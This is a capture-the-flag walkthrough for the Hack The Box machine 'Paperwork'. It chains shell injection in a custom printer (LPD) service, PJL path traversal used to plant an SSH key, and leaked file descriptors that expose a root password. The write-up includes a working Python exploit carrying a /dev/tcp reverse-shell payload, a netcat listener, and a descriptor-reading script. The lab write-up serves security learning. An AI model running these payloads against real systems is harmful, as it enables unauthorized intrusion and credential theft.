# Hack The Box - Paperwork Walkthrough

## Machine Information
| Field | Value |
|------|------|
| Name | Paperwork |
| Platform | Hack The Box |
| OS | Linux |
| Difficulty | Easy |
| Release Date | 11th July, 2026 |

## Overview
Paperwork is a Linux machine that exploits vulnerabilities in an LPD (Line Printer Daemon) service running on port 1515. The service implements the RFC 1179 protocol but fails to sanitize user input, leading to shell injection via a command construction vulnerability. 
After gaining initial access as the lp user through LPD exploitation, privilege escalation is achieved by abusing file permissions on critical binaries that are executed by root processes.  

## Attack Chain    
Reconnaissance: Discover LPD service on port 1515 with a custom "Archive_Printer" processor  
Exploitation: Forge LPD protocol messages with shell metacharacters to inject arbitrary bash commands  
Initial Access: Achieve RCE as ** user via shell injection in job name processing  
Privilege Escalation: Exploit insecure file permissions to escalate to root  
Post-Exploitation: Flag capture and system compromise  

## Skills / Techniques  
Network Service Enumeration (LPD/RFC 1179)  
Protocol Analysis & Packet Crafting  
Shell Injection & Command Injection  
Python Socket Programming  
Reverse Shell Payload Construction  
Privilege Escalation via File Permissions  
Bash/Shell Exploitation  

## RECON 
```
sudo nmap -sV -p- <IPAddress>                       
Nmap scan report for paperwork.htb (<IPAddress>)
Host is up (0.098s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http           nginx 1.28.0 (Ubuntu)
1515/tcp open  ifor-protocol?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1515-TCP:V=7.99%I=7%D=7/12%Time=6A53C480%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,27,"Archive_Printer\x20is\x20ready\x20and\x20printin
SF:g\.\n")%r(TerminalServer,27,"Archive_Printer\x20is\x20ready\x20and\x20p
SF:rinting\.\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### HTTP Service Enumeration (Port 80)  
Initial port scanning revealed an Nginx web server running on port 80. Accessing the service displays an "Intake Portal" for the "Paperwork" archive system.  
The page contains a System Configuration section that provides critical information about the LPD backend:  
- Protocol: Compliance Level: RFC 1179
- Target Queue: archive_intake
- Internal Processor: paperwork-archive-v1.02

More importantly, the portal offers a downloadable archive containing backend source code. By downloading this ZIP file, we obtain:  
- server.py — The vulnerable LPD server implementation

The service on port 1515 was initially unrecognized by Nmap. However, the service responded with a distinctive banner:  
Archive_Printer is ready and printing.  

### Initial Service Testing - Telnet Connection Attempts  
To interact with the LPD service on port 1515, telnet was used for initial reconnaissance:  
```
telnet 10.129.29.179 1515
Connected to 10.129.29.179.
Escape character is '^]'.
```
Attempting basic shell commands such as ls resulted in immediate connection closure, indicating the service expects a specific protocol rather than accepting arbitrary text input.  

### Source Code Analysis & Control Bypass  
Examining the downloaded server.py revealed critical validation checks:  
#### Queue Name Validation:
```
def handle_print_job(self, data):
    queue = data[1:].decode().strip()
    
    if queue not in VALID_QUEUE:
        print(f"{self.id} Rejected: Invalid queue '{queue}'")
        self.sock.send(b'\x01') 
        return
```
The server extracts the queue name from the received data (skipping the first byte which contains the command \x02) and validates it against the LPD_QUEUE environment variable.  
Invalid queues result in a \x01 (error) response and connection termination.  
Once a valid queue is accepted, the server enters a loop to receive file data:    
The server expects a size value which dictates how many bytes of content to receive. This size is parsed from the incoming data after the subcommand byte.  
#### Job Name Extraction & Injection Point
Once a valid queue is accepted, the server processes incoming data and searches for a line starting with J:
```
job_name = "Unknown"
for line in decoded_content.split('\n'):
    line = line.strip()
    if line.startswith('J'):
        job_name = line[1:]
        break
```
The J marker is part of the LPD protocol specification for designating the job name. Everything after the J character becomes the job_name variable. This is the critical injection point.  

#### Command Injection Vulnerability  
The vulnerability lies in how job_name is processed:
```
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```
The job_name variable is inserted directly into a shell command with shell=True enabled and no sanitization. This enables arbitrary command injection through shell metacharacters.
A payload like:  
```
J'; bash -c "reverse_shell_command" # extracts as:  
```
Which constructs the final command:
```
echo 'Archive: '; bash -c "reverse_shell_command" #' >> /tmp/archive.log
```
The closing quote terminates the echo string, the semicolon separates commands, and the # comments out the remaining log redirection—achieving arbitrary code execution.
Valid Queue: archive_intake  
The HTTP portal revealed:  
- Target Queue: archive_intake
With the valid queue name and injection point identified, exploitation became straightforward.

### Exploit Execution
The following Python script automates the exploitation chain against the vulnerable LPD service:  
```
import socket, time
MACHINE_IP = '<target_ip>'
YOUR_IP = '<attacker_ip>'
YOUR_PORT = 4443

sock = socket.socket()
sock.connect((MACHINE_IP, 1515))

# Step 1: Queue Initialization
sock.send(b'\x02archive_intake\n')
time.sleep(0.3)
sock.recv(1024)

# Step 2: Payload Header Construction
job = f"J'; bash -c \"bash -i >& /dev/tcp/{YOUR_IP}/{YOUR_PORT} 0>&1\" #\n"
header = b'\x02' + str(len(job)).encode() + b'\n'
sock.send(header)
time.sleep(0.3)
sock.recv(1024)

# Step 3: Send Payload
sock.send(job.encode())
time.sleep(0.3)
sock.recv(1024)

# Step 4: Finalize
sock.send(b'\x03\x00\n')
time.sleep(1)
sock.close()

print('[+] Exploit sent!')
```

### Exploitation Sequence
Step 1 - Queue Initialization: Sends the print job submission command (\x02) with the valid queue name archive_intake. The sleep allows server processing, and recv() consumes the server's ACK.  
Step 2 - Payload Header: Constructs the job name string beginning with J (LPD marker), followed by a single quote that closes the echo string in the vulnerable subprocess. The bash command creates an interactive reverse shell via /dev/tcp. The header contains the submission command, payload size in ASCII, and newline delimiter.  
Step 3 - Send Payload: Transmits the actual payload. The server extracts the job name by searching for the line starting with J.  
Step 4 - Finalize: Sends the LPD "end of job" command (\x03), triggering server-side processing of the malicious payload.  
 
The extracted job_name is:  
```
'; bash -c "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1" #  
```
This transforms the subprocess command into:  
```
echo 'Archive: '; bash -c "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1" #' >> /tmp/archive.log  
```
### Execution
#### Terminal 1 - Listener:
```
nc -lvnp 4443
```
#### Terminal 2 - Run Exploit:
```
python exploit.py
```
A reverse shell prompt appears connected as the ** user.

### Lateral Movement to User A********
#### Port 9100 Service Discovery
While exploring the compromised system as the ** user, port scanning revealed an additional service:
```
ss -tulnp
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                          
udp   UNCONN 0      0         127.0.0.54:53        0.0.0.0:*                                    
udp   UNCONN 0      0      127.0.0.53%lo:53        0.0.0.0:*                                    
udp   UNCONN 0      0            0.0.0.0:68        0.0.0.0:*                                    
udp   UNCONN 0      0          127.0.0.1:323       0.0.0.0:*                                    
udp   UNCONN 0      0              [::1]:323          [::]:*                                    
tcp   LISTEN 0      4096      127.0.0.54:53        0.0.0.0:*                                    
tcp   LISTEN 0      100        127.0.0.1:9100      0.0.0.0:*                                    
tcp   LISTEN 0      100          0.0.0.0:1515      0.0.0.0:*    users:(("python3",pid=984,fd=3))
tcp   LISTEN 0      4096         0.0.0.0:22        0.0.0.0:*                                    
tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*                                    
tcp   LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*                                    
tcp   LISTEN 0      128        127.0.0.1:1337      0.0.0.0:*                                    
tcp   LISTEN 0      4096            [::]:22           [::]:*
```
Process enumeration showed this service was running as the a******** user:
```
ps aux | grep -i 9100
ps aux | grep -i 9100
a*****+     981  0.0  0.4  28040 17448 ?        Ss   13:51   0:00 /usr/bin/python3 /home/a********/printer/jetdirect.py 9100 /home/a********/printer/ /home/a********/printer/logs/commands.log
lp          1939  0.0  0.2  25916 11424 pts/2    S+   15:17   0:00 curl -sk 127.0.0.1:9100
lp          1949  0.0  0.0   7560  3524 pts/3    S+   15:18   0:00 telnet 127.0.0.1 9100
lp          1955  0.0  0.0   7560  3516 pts/4    S+   15:19   0:00 telnet 127.0.0.1 9100
lp          1971  0.0  0.0   7560  3528 pts/5    S+   15:22   0:00 telnet 127.0.0.1 9100
lp          1978  0.0  0.0   7560  3540 pts/6    S+   15:24   0:00 telnet 127.0.0.1 9100
lp          1992  0.0  0.0   6864  2512 pts/7    S+   15:25   0:00 grep -i 9100
```
The jetdirect.py script implements a printer emulation service using Printer Job Language (PJL) protocol.  
#### JetDirect PJL Path Traversal
Connecting to the JetDirect service revealed it processes PJL commands for filesystem operations:  
```
telnet 127.0.0.1 9100
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
@PJL INFO ID
HP LASERJET 4ML
@PJL INFO STATUS
OK
@PJL INFO VARIABLES
OK
@PJL INFO FILESYS
VOLUME TOTAL SIZE FREE SPACE LOCATION LABEL STATUS
0:     1755136    1718272    <HT>     <HT>  READ-WRITE
@PJL FSDIRLIST NAME="0:\"
. TYPE=DIR
.. TYPE=DIR
logs TYPE=DIR SIZE=4096
jetdirect.py TYPE=FILE SIZE=5119
```
The service uses a filesystem abstraction prefixed with 0:\, where 0: represents a virtual drive root.  
Path Traversal Vulnerability: By using relative path traversal sequences (0:\..), it was possible to escape the intended directory and access parent directories:  

```
@PJL FSDIRLIST NAME="0:\..\"
. TYPE=DIR
.. TYPE=DIR
.cache TYPE=DIR SIZE=4096
.bashrc TYPE=FILE SIZE=3771
.local TYPE=DIR SIZE=4096
.ssh TYPE=DIR SIZE=4096
.profile TYPE=FILE SIZE=807
.lesshst TYPE=FILE SIZE=20
.bash_history TYPE=FILE SIZE=0
user.txt TYPE=FILE SIZE=33
.bash_logout TYPE=FILE SIZE=220
.gnupg TYPE=DIR SIZE=4096
printer TYPE=DIR SIZE=4096
```

So we grabbed the user.txt flag: 
```
@PJL FSUPLOAD NAME="0:\..\user.txt" SIZE=33
c******************************2
```
#### SSH Key Injection via Path Traversal
Using the @PJL FSDOWNLOAD command with path traversal, it was possible to write directly to the authorized_keys file.  

The exploit sequence:  
Send the FSDOWNLOAD command with path traversal to target the SSH key file:  
```
@PJL FSDOWNLOAD NAME="../.ssh/authorized_keys" SIZE=91
```
Press ENTER. 
Paste the attacker's public key:
ssh-ed25519 A******************************************************************E kali@kali
Press ENTER to finalize the write operation and the server gives OK back.  

The JetDirect service processes the FSDOWNLOAD command and writes the pasted content directly into /home/a********/.ssh/authorized_keys, effectively injecting the attacker's public key into the file.  

#### SSH Access as A********:  

With the public key now present in authorized_keys:
```
ssh -i id_ed25519 a********@paperwork.htb 
```
As A******** we ran linpeas.sh and we found something a juicy custom unix socket, owned by root:  
```
╔══════════╣ Unix Sockets Analysis (T1571,T1049)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                   
/run/dbus/system_bus_socket                                                                                                 
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
  └─High risk: root-owned and writable Unix socket
/run/paperwork/mgmt.sock
  └─(Read Write )
  └─(Owned by root)
  └─High risk: root-owned and writable Unix socket
[...]
```

Unlike the standard system sockets, this one appeared to belong to the custom Paperwork application. Connecting to it with socat returned the message:  

ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED  



```
ss -xlp | grep paperwork # search for socket
u_str LISTEN 0      5                             /run/paperwork/mgmt.sock 13948            * 0 
```
Connecting to the socket with socat produced an interesting response:  
```
socat - UNIX-CONNECT:/run/paperwork/mgmt.sock
ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
```
However, a simple Python client only received:
```
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")
print(s.recv(4096))

# Output: 
b'STATUS: SYSTEM_CLEAN
SIGNATURE: d92938059e3e5371cf54db65d60963aecacedf69e493c44a8b618036b07cbdbe'
```
The different responses suggested that the daemon entered a special "forensic" mode only under specific conditions.  
I identified the process handling the socket:  
```
ps -ef | grep paperwork
root 1481 1 0 ? 00:00:00 /usr/bin/python3 /usr/bin/paperwork-daemon
```
The script was world-readable, so I inspected it:
```head -100 /usr/bin/paperwork-daemon```

The source code revealed that it opened /etc/paperwork/admin_pins.conf as root at startup:
```admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)```
It also monitored the printer log:    
```LOG_PATH = "/home/a********/printer/logs/commands.log"```
Whenever the log contained any of the strings:  
```
FSQUERY
FSUPLOAD
FSDOWNLOAD
```
the daemon executed:
```
trigger_lockdown(conn)
```
Inside this function, it leaked two file descriptors using sendmsg() and SCM_RIGHTS:  
```
evidence_bundle = array.array("i", [log_fd, admin_fd])

conn.sendmsg(
    [msg],
    [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)]
)
```
To trigger this condition, I sent a PJL command to the vulnerable JetDirect service:  
```
@PJL FSQUERY NAME="0:\jetdirect.py"
```
Then I connected again to the management socket using a Python client capable of receiving ancillary data:  
```
cat exploit.py
import socket, array, os
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.connect("/run/paperwork/mgmt.sock")
fds = array.array("i")
msg, ancdata, flags, _ = sock.recvmsg(4096, socket.CMSG_SPACE(2 * fds.itemsize))
print(msg)
for level, ctype, data in ancdata:
    if level == socket.SOL_SOCKET and ctype == socket.SCM_RIGHTS:
        fds.frombytes(data)
for fd in fds:
    os.lseek(fd, 0, os.SEEK_SET)
    print(os.read(fd, 4096).decode())
```
This returned the leaked file descriptors. One of them referenced /etc/paperwork/admin_pins.conf, allowing me to read the administrator credentials directly from the already-open file descriptor.  
```
python exploit.py
b'ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.'
array('i', [4, 5])
FD 4
Listening on port 9100
[...]
Listening on port 9100
[127.0.0.1] connected
Command: @PJL FSDOWNLOAD NAME="../.ssh/authorized_keys" SIZE=91
Receiving file: ../.ssh/authorized_keys (91 bytes)
[127.0.0.1] connected
Command: @PJL FSQUERY NAME="0:\jetdirect.py"

FD 5
ADMIN_PASSWORD=A********************2

a********@paperwork:/tmp$ su root
Password: 
root@paperwork:~# cat /root/root.txt 
d******************************0
```
With the recovered administrator password, I authenticated as root and cat the root flag.

Cyall.

